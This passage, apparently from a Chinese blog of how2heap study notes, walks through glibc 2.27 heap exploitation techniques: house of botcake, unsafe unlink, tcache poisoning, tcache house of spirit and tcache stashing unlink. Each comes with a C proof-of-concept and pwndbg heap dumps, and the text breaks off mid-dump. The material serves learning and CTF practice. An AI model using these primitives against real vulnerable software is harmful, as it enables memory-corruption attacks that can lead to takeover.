fd: 0x405260

Free chunk (tcache) | PREV_INUSE
Addr: 0x4052f0
Size: 0x51
fd: 0x4052b0

Free chunk (tcache) | PREV_INUSE
Addr: 0x405340
Size: 0x51
fd: 0x405300

Free chunk (tcache) | PREV_INUSE
Addr: 0x405390
Size: 0x51
fd: 0x405350

Free chunk (tcache) | PREV_INUSE
Addr: 0x4053e0
Size: 0x51
fd: 0x4053a0

Free chunk (tcache) | PREV_INUSE
Addr: 0x405430
Size: 0x51
fd: 0x4053f0

Free chunk (fastbins) | PREV_INUSE
Addr: 0x405480
Size: 0x51
fd: 0x7fffffffdc60							&lt;-- target

...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>将<code>tachce</code>全部申请完再申请一次之后目的地址会出现在<code>tcache</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
tcachebins
0x50 [  7]: 0x7fffffffdc70 —▸ 0x405490 —▸ 0x4054e0 —▸ 0x405530 —▸ 0x405580 —▸ 0x4055d0 —▸ 0x405620 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0xcdcdcdcdcdcdcdcd
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="house-of-botcake-double-free"><a href="#house-of-botcake-double-free" class="headerlink" title="house_of_botcake(double free)"></a>house_of_botcake(double free)</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdint.h&gt;
#include &lt;assert.h&gt;


int main()
&#123;
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);

    intptr_t stack_var[4];
    intptr_t *x[7];
    for(int i&#x3D;0; i&lt;sizeof(x)&#x2F;sizeof(intptr_t*); i++)&#123;
        x[i] &#x3D; malloc(0x100);
    &#125;
    
    intptr_t *prev &#x3D; malloc(0x100);
    intptr_t *a &#x3D; malloc(0x100);
    malloc(0x10);
    
    for(int i&#x3D;0; i&lt;7; i++)&#123;
        free(x[i]);
    &#125;
    free(a);
    free(prev);
    
    malloc(0x100);
    free(a);
    
    intptr_t *b &#x3D; malloc(0x120);
    b[0x120&#x2F;8-2] &#x3D; (long)stack_var;
    
    malloc(0x100);
    intptr_t *c &#x3D; malloc(0x100);
    
    assert(c&#x3D;&#x3D;stack_var);
    return 0;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>利用<code>double free</code>使得同一个堆同时出现在<code>tcache</code>和<code>unsorted bin</code>造成堆块重叠</p>
<p>创建7个堆填满<code>tcache</code>，两个堆用于填入<code>unsorted bin</code>，最后一个堆防止和<code>top chunk</code>合并</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x251

Allocated chunk | PREV_INUSE
Addr: 0x405250
Size: 0x111

Allocated chunk | PREV_INUSE
Addr: 0x405360
Size: 0x111

Allocated chunk | PREV_INUSE
Addr: 0x405470
Size: 0x111

Allocated chunk | PREV_INUSE
Addr: 0x405580
Size: 0x111

Allocated chunk | PREV_INUSE
Addr: 0x405690
Size: 0x111

Allocated chunk | PREV_INUSE
Addr: 0x4057a0
Size: 0x111

Allocated chunk | PREV_INUSE
Addr: 0x4058b0
Size: 0x111

Allocated chunk | PREV_INUSE
Addr: 0x4059c0
Size: 0x111

Allocated chunk | PREV_INUSE
Addr: 0x405ad0
Size: 0x111

Allocated chunk | PREV_INUSE
Addr: 0x405be0
Size: 0x21

Top chunk | PREV_INUSE
Addr: 0x405c00
Size: 0x20401<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>将所有堆释放以进入对应的<code>bin</code>，其中<code>unsorted bin</code>中的两个堆合并</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
tcachebins
0x110 [  7]: 0x4058c0 —▸ 0x4057b0 —▸ 0x4056a0 —▸ 0x405590 —▸ 0x405480 —▸ 0x405370 —▸ 0x405260 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x4059c0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x4059c0
smallbins
empty
largebins
empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>创建一个堆让<code>tcache</code>有一个空位</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
tcachebins
0x110 [  6]: 0x4057b0 —▸ 0x4056a0 —▸ 0x405590 —▸ 0x405480 —▸ 0x405370 —▸ 0x405260 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x4059c0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x4059c0
smallbins
empty
largebins
empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>再次释放<code>unsorted bin</code>的第一个堆使其进入<code>tcache</code>，此时<code>tcache</code>和<code>unsorted bin</code>的第一个堆是同一个堆，造成了堆块重叠</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
tcachebins
0x110 [  7]: 0x405ae0 —▸ 0x4057b0 —▸ 0x4056a0 —▸ 0x405590 —▸ 0x405480 —▸ 0x405370 —▸ 0x405260 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x4059c0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x4059c0
smallbins
empty
largebins
empty
pwndbg&gt; x&#x2F;20gx 0x405ad0
0x405ad0:       0x0000000000000000      0x0000000000000111
0x405ae0:       0x00000000004057b0      0x00007ffff7dcfca0
0x405af0:       0x0000000000000000      0x0000000000000000
0x405b00:       0x0000000000000000      0x0000000000000000
0x405b10:       0x0000000000000000      0x0000000000000000
0x405b20:       0x0000000000000000      0x0000000000000000
0x405b30:       0x0000000000000000      0x0000000000000000
0x405b40:       0x0000000000000000      0x0000000000000000
0x405b50:       0x0000000000000000      0x0000000000000000
0x405b60:       0x0000000000000000      0x0000000000000000
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>创建一个比释放的堆大一点的堆，这个堆会从<code>unsorted bin</code>中切割，且和<code>tcache</code>中第一个地址相同</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x251

Free chunk (tcache) | PREV_INUSE
Addr: 0x405250
Size: 0x111
fd: 0x00

Free chunk (tcache) | PREV_INUSE
Addr: 0x405360
Size: 0x111
fd: 0x405260

Free chunk (tcache) | PREV_INUSE
Addr: 0x405470
Size: 0x111
fd: 0x405370

Free chunk (tcache) | PREV_INUSE
Addr: 0x405580
Size: 0x111
fd: 0x405480

Free chunk (tcache) | PREV_INUSE
Addr: 0x405690
Size: 0x111
fd: 0x405590

Free chunk (tcache) | PREV_INUSE
Addr: 0x4057a0
Size: 0x111
fd: 0x4056a0

Allocated chunk | PREV_INUSE
Addr: 0x4058b0
Size: 0x111

Allocated chunk | PREV_INUSE
Addr: 0x4059c0
Size: 0x131

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x405af0
Size: 0xf1
fd: 0x7ffff7dcfca0
bk: 0x7ffff7dcfca0

Allocated chunk
Addr: 0x405be0
Size: 0x20

Top chunk | PREV_INUSE
Addr: 0x405c00
Size: 0x20401<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>修改刚创建的堆的<code>fd</code>位置，此时<code>tcache</code>中的堆会被修改，实现任意地址写</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
tcachebins
0x110 [  7]: 0x405ae0 —▸ 0x7fffffffdcf0 —▸ 0x7fffffffdd58 —▸ 0x7fffffffde28 —▸ 0x7fffffffe1c1 ◂— &#39;&#x2F;home&#x2F;starrysky&#x2F;how2heap&#x2F;how2heap&#x2F;glibc_2.27&#x2F;house_of_botcake&#39;
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x405af0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x405af0
smallbins
empty
largebins
empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="unsafe-unlink-unlink"><a href="#unsafe-unlink-unlink" class="headerlink" title="unsafe_unlink(unlink)"></a>unsafe_unlink(unlink)</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;
#include &lt;assert.h&gt;

uint64_t *chunk0_ptr;

int main()
&#123;
	setbuf(stdout, NULL);
	
	int malloc_size &#x3D; 0x420;
	int header_size &#x3D; 2;

	chunk0_ptr &#x3D; (uint64_t*) malloc(malloc_size);
	uint64_t *chunk1_ptr  &#x3D; (uint64_t*) malloc(malloc_size); 
	
	chunk0_ptr[2] &#x3D; (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*3);
	chunk0_ptr[3] &#x3D; (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*2);
	
	uint64_t *chunk1_hdr &#x3D; chunk1_ptr - header_size;
	
	chunk1_hdr[0] &#x3D; malloc_size;
	chunk1_hdr[1] &amp;&#x3D; ~1;

	free(chunk1_ptr);

	char victim_string[8];
	strcpy(victim_string,&quot;Hello!~&quot;);
	chunk0_ptr[3] &#x3D; (uint64_t) victim_string;

	chunk0_ptr[0] &#x3D; 0x4141414142424242LL;

	assert(*(long *)victim_string &#x3D;&#x3D; 0x4141414142424242L);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>tcache</code>最大范围是<code>0x408</code>,超过这个范围的会被释放到<code>unsorted bin</code></p>
<p>创建属于<code>unsorted bin</code>的堆之后伪造一个堆绕过<code>unlink</code>的检查</p>
<p><code>unlink</code>相关检查</p>
<pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;* Take a chunk off a bin list *&#x2F;
#define unlink(AV, P, BK, FD) &#123;                                           
    if (__builtin_expect (chunksize(P) !&#x3D; prev_size (next_chunk(P)), 0))      
      malloc_printerr (&quot;corrupted size vs. prev_size&quot;);                
    FD &#x3D; P-&gt;fd;                               
    BK &#x3D; P-&gt;bk;                               
    if (__builtin_expect (FD-&gt;bk !&#x3D; P || BK-&gt;fd !&#x3D; P, 0))           
      malloc_printerr (&quot;corrupted double-linked list&quot;);                
    else &#123;                            
        FD-&gt;bk &#x3D; BK;                           
        BK-&gt;fd &#x3D; FD;                           
        if (!in_smallbin_range (chunksize_nomask (P))              
            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize !&#x3D; NULL, 0)) &#123;          
       if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize !&#x3D; P, 0)       
      || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize !&#x3D; P, 0))    
         malloc_printerr (&quot;corrupted double-linked list (not small)&quot;);   
            if (FD-&gt;fd_nextsize &#x3D;&#x3D; NULL) &#123;                
                if (P-&gt;fd_nextsize &#x3D;&#x3D; P)                  
                  FD-&gt;fd_nextsize &#x3D; FD-&gt;bk_nextsize &#x3D; FD;           
                else &#123;                         
                    FD-&gt;fd_nextsize &#x3D; P-&gt;fd_nextsize;              
                    FD-&gt;bk_nextsize &#x3D; P-&gt;bk_nextsize;              
                    P-&gt;fd_nextsize-&gt;bk_nextsize &#x3D; FD;              
                    P-&gt;bk_nextsize-&gt;fd_nextsize &#x3D; FD;              
                  &#125;                            
              &#125; else &#123;                         
                P-&gt;fd_nextsize-&gt;bk_nextsize &#x3D; P-&gt;bk_nextsize;           
                P-&gt;bk_nextsize-&gt;fd_nextsize &#x3D; P-&gt;fd_nextsize;           
              &#125;                               
          &#125;                               
      &#125;                                  
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>伪造堆需要绕过：<code>FD-&gt;bk = BK; BK-&gt;fd = FD;</code></p>
<p>伪造完成后改地址相邻的下一个堆的的<code>prve_size</code>为伪造的堆大小、<code>inuse</code>位为<code>0</code>再释放掉它即可向后合并取消连接<code>fake chunk</code></p>
<p>先创建两个堆</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x251

Allocated chunk | PREV_INUSE
Addr: 0x405250
Size: 0x431

Allocated chunk | PREV_INUSE
Addr: 0x405680
Size: 0x431

Top chunk | PREV_INUSE
Addr: 0x405ab0
Size: 0x20551<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在第一个堆伪造一个堆的<code>fd、bk</code>并把第二个堆<code>inuse</code>位和<code>prve_size</code>位改掉</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x251

Allocated chunk | PREV_INUSE
Addr: 0x405250
Size: 0x431

Allocated chunk
Addr: 0x405680
Size: 0x430

Top chunk | PREV_INUSE
Addr: 0x405ab0
Size: 0x20551

pwndbg&gt; x&#x2F;20gx 0x405250
0x405250:	0x0000000000000000	0x0000000000000431
0x405260:	0x0000000000000000	0x0000000000000000
0x405270:	0x0000000000404050	0x0000000000404058
0x405280:	0x0000000000000000	0x0000000000000000
0x405290:	0x0000000000000000	0x0000000000000000
0x4052a0:	0x0000000000000000	0x0000000000000000
0x4052b0:	0x0000000000000000	0x0000000000000000
0x4052c0:	0x0000000000000000	0x0000000000000000
0x4052d0:	0x0000000000000000	0x0000000000000000
0x4052e0:	0x0000000000000000	0x0000000000000000
pwndbg&gt; x&#x2F;20gx 0x405680
0x405680:	0x0000000000000420	0x0000000000000430
0x405690:	0x0000000000000000	0x0000000000000000
0x4056a0:	0x0000000000000000	0x0000000000000000
0x4056b0:	0x0000000000000000	0x0000000000000000
0x4056c0:	0x0000000000000000	0x0000000000000000
0x4056d0:	0x0000000000000000	0x0000000000000000
0x4056e0:	0x0000000000000000	0x0000000000000000
0x4056f0:	0x0000000000000000	0x0000000000000000
0x405700:	0x0000000000000000	0x0000000000000000
0x405710:	0x0000000000000000	0x0000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>释放第二个堆即可通过第一个堆去改任意地址的内容</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x251

Allocated chunk | PREV_INUSE
Addr: 0x405250
Size: 0x431

Allocated chunk
Addr: 0x405680
Size: 0x430

Allocated chunk | PREV_INUSE
Addr: 0x405ab0
Size: 0x20551

pwndbg&gt; x&#x2F;20gx 0x405250
0x405250:	0x0000000000000000	0x0000000000000431
0x405260:	0x0000000000000000	0x0000000000020da1
0x405270:	0x0000000000404050	0x0000000000404058
0x405280:	0x0000000000000000	0x0000000000000000
0x405290:	0x0000000000000000	0x0000000000000000
0x4052a0:	0x0000000000000000	0x0000000000000000
0x4052b0:	0x0000000000000000	0x0000000000000000
0x4052c0:	0x0000000000000000	0x0000000000000000
0x4052d0:	0x0000000000000000	0x0000000000000000
0x4052e0:	0x0000000000000000	0x0000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache_poisoning"></a>tcache_poisoning</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdint.h&gt;
#include &lt;assert.h&gt;

int main()
&#123;
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);

	size_t stack_var;
	intptr_t *a &#x3D; malloc(128);
	intptr_t *b &#x3D; malloc(128);
    
	free(a);
	free(b);

	b[0] &#x3D; (intptr_t)&amp;stack_var;
	intptr_t *c &#x3D; malloc(128);

	assert((long)&amp;stack_var &#x3D;&#x3D; (long)c);
	return 0;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>打<code>fd</code>实现任意地址读写</p>
<p>创建两个堆再释放掉，进入<code>tcache</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x251

Free chunk (tcache) | PREV_INUSE
Addr: 0x405250
Size: 0x91
fd: 0x00

Free chunk (tcache) | PREV_INUSE
Addr: 0x4052e0
Size: 0x91
fd: 0x405260

Top chunk | PREV_INUSE
Addr: 0x405370
Size: 0x20c91<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>改第二个堆的<code>fd</code>为目标地址之后再申请即可实现任意地址读写</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x251

Allocated chunk | PREV_INUSE
Addr: 0x405250
Size: 0x91

Free chunk (tcache) | PREV_INUSE
Addr: 0x4052e0
Size: 0x91
fd: 0x7fffffffdd70

Top chunk | PREV_INUSE
Addr: 0x405370
Size: 0x20c91<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache_house_of_spirit"></a>tcache_house_of_spirit</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;assert.h&gt;

int main()
&#123;
	setbuf(stdout, NULL);

	malloc(1);

	unsigned long long *a; 
	unsigned long long fake_chunks[10]; 
    
	fake_chunks[1] &#x3D; 0x40; 
	a &#x3D; &amp;fake_chunks[2];

	free(a);

	void *b &#x3D; malloc(0x30);

	assert((long)b &#x3D;&#x3D; (long)&amp;fake_chunks[2]);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在栈上伪造一个堆之后释放掉再申请即可申请到伪造的堆，<code>tcache</code>会判断取出堆之后的下标不能为负数，所以要先创建一个堆</p>
<p>先随便创建一个堆</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x251

Allocated chunk | PREV_INUSE
Addr: 0x405250
Size: 0x21

Top chunk | PREV_INUSE
Addr: 0x405270
Size: 0x20d91<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>再在栈上伪造一个堆，主要是伪造<code>size</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x7fffffffdd20
0x7fffffffdd20:	0x000000000000000f	0x0000000000000040
0x7fffffffdd30:	0x00007fffffffdd98	0x00000000000000f0
0x7fffffffdd40:	0x00000000000000c2	0x00000000004013ad
0x7fffffffdd50:	0x00007ffff7de59a0	0x0000000000000000
0x7fffffffdd60:	0x0000000000401360	0x00000000004010f0
0x7fffffffdd70:	0x00007fffffffde60	0x00007fffffffdd30
0x7fffffffdd80:	0x0000000000401360	0x00007ffff7a05b97
0x7fffffffdd90:	0x0000000000000001	0x00007fffffffde68
0x7fffffffdda0:	0x000000010000c000	0x00000000004011d6
0x7fffffffddb0:	0x0000000000000000	0x762a1758ffbc0fb4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>释放之后再申请即可申请到这个位置实现任意地址读写</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
tcachebins
0x40 [  1]: 0x7fffffffdd30 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache_stashing_unlink_attack"></a>tcache_stashing_unlink_attack</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;assert.h&gt;

int main()&#123;
    unsigned long stack_var[0x10] &#x3D; &#123;0&#125;;
    unsigned long *chunk_lis[0x10] &#x3D; &#123;0&#125;;
    unsigned long *target;

    setbuf(stdout, NULL);

    stack_var[3] &#x3D; (unsigned long)(&amp;stack_var[2]);

    for(int i &#x3D; 0;i &lt; 9;i++)&#123;
        chunk_lis[i] &#x3D; (unsigned long*)malloc(0x90);
    &#125;

    for(int i &#x3D; 3;i &lt; 9;i++)&#123;
        free(chunk_lis[i]);
    &#125;

    free(chunk_lis[1]);
    free(chunk_lis[0]);
    free(chunk_lis[2]);
    
    malloc(0xa0);
    malloc(0x90);
    malloc(0x90);

    chunk_lis[2][1] &#x3D; (unsigned long)stack_var;
    calloc(1,0x90);

    target &#x3D; malloc(0x90);   

    assert(target &#x3D;&#x3D; &amp;stack_var[2]);
    return 0;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>该方法是<code>2.27</code>或<code>2.29</code>下用<code>calloc</code>创建堆时候针对<code>small bin</code>的攻击</p>
<p>创建<code>9</code>个大小属于<code>unsorted bin</code>的堆并全部释放</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
tcachebins
0xa0 [  7]: 0x405300 —▸ 0x405760 —▸ 0x4056c0 —▸ 0x405620 —▸ 0x405580 —▸ 0x4054e0 —▸ 0x405440 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x405390 —▸ 0x405250 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x405390
smallbins
empty
largebins
empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>创建一个比释放的堆大的堆使得释放的堆进入<code>small bin</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
tcachebins
0xa0 [  7]: 0x405300 —▸ 0x405760 —▸ 0x4056c0 —▸ 0x405620 —▸ 0x405580 —▸ 0x4054e0 —▸ 0x405440 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
0xa0: 0x405390 —▸ 0x405250 —▸ 0x7ffff7dcfd30 (main_arena+240) ◂— 0x405390
largebins
empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>接着从<code>tcache</code>取了两个堆</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
tcachebins
0xa0 [  5]: 0x4056c0 —▸ 0x405620 —▸ 0x405580 —▸ 0x4054e0 —▸ 0x405440 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
0xa0: 0x405390 —▸ 0x405250 —▸ 0x7ffff7dcfd30 (main_arena+240) ◂— 0x405390
largebins
empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>将<code>small bin</code>的最后一个堆<code>fd</code>改成栈上的地址，即目标地址</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
tcachebins
0xa0 [  5]: 0x4056c0 —▸ 0x405620 —▸ 0x405580 —▸ 0x4054e0 —▸ 0x405440 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
0xa0 [corrupted]
FD: 0x405390 —▸ 0x405250 —▸ 0x7ffff7dcfd30 (main_arena+240) ◂— 0x405390
BK: 0x405250 —▸ 0x405390 —▸ 0x7fffffffdcd0 —▸ 0x7fffffffdce0 ◂— 0x0
largebins
empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>由于<code>calloc</code>不会从<code>tcache</code>中取堆，所以用<code>calloc</code>创建一个堆，<code>tcache</code>中有两个空位，此时<code>small bin</code>中的堆会进入<code>tcache</code>，再次用<code>malloc</code>申请即可得到篡改的栈地址</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
tcachebins
